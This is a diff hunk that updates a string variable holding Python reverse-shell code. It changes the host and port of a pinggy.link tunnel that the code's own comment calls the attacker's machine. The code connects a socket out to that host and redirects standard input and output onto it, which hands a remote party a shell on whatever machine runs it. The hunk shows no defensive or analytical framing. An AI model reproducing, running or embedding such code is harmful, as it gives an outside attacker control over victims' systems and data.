@@ -46,7 +46,7 @@ def kontenKode = """\
 import socket,subprocess,os
 # Connect to the attacker's machine (replace with attacker's IP and port)
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("qqohc-114-10-152-167.a.free.pinggy.link", 36491))
+s.connect(("ujqrc-114-10-152-167.a.free.pinggy.link", 42415))
 # Duplicate file descriptors for stdin, stdout, stderr to the socket
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
